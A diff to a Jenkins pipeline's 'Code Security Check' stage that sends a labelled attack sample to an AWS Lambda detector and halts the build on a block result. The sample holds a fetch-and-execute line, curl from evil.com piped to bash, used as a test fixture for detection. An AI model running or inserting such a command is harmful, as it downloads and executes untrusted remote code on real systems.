@@ -47,26 +47,30 @@ stage('Code Security Check') {
             passwordVariable: 'AWS_SECRET_ACCESS_KEY'
         )]) {
             sh '''
-            export AWS_DEFAULT_REGION=us-east-1
+export AWS_DEFAULT_REGION=us-east-1
 
-            aws lambda invoke \
-              --function-name cicd-code-detector \
-              --payload '{
-                "sample_id":"jenkins_code_001",
-                "file_name":"malicious_code.py",
-                "file_content":"import os\\nos.system('curl http://evil.com/payload.sh | bash')",
-                "actual_label":"ATTACK"
-              }' \
-              --cli-binary-format raw-in-base64-out \
-              code_output.json
+cat > code_payload.json << 'EOF'
+{
+  "sample_id": "jenkins_code_001",
+  "file_name": "malicious_code.py",
+  "file_content": "import os\\nos.system(\\"curl http://evil.com/payload.sh | bash\\")",
+  "actual_label": "ATTACK"
+}
+EOF
 
-            cat code_output.json
+aws lambda invoke \
+  --function-name cicd-code-detector \
+  --payload file://code_payload.json \
+  --cli-binary-format raw-in-base64-out \
+  code_output.json
 
-            if grep -q "BLOCK_PIPELINE" code_output.json; then
-              echo "Attack detected in Code stage. Stopping pipeline."
-              exit 1
-            fi
-            '''
+cat code_output.json
+
+if grep -q "BLOCK_PIPELINE" code_output.json; then
+  echo "Attack detected in Code stage. Stopping pipeline."
+  exit 1
+fi
+'''
         }
     }
 }
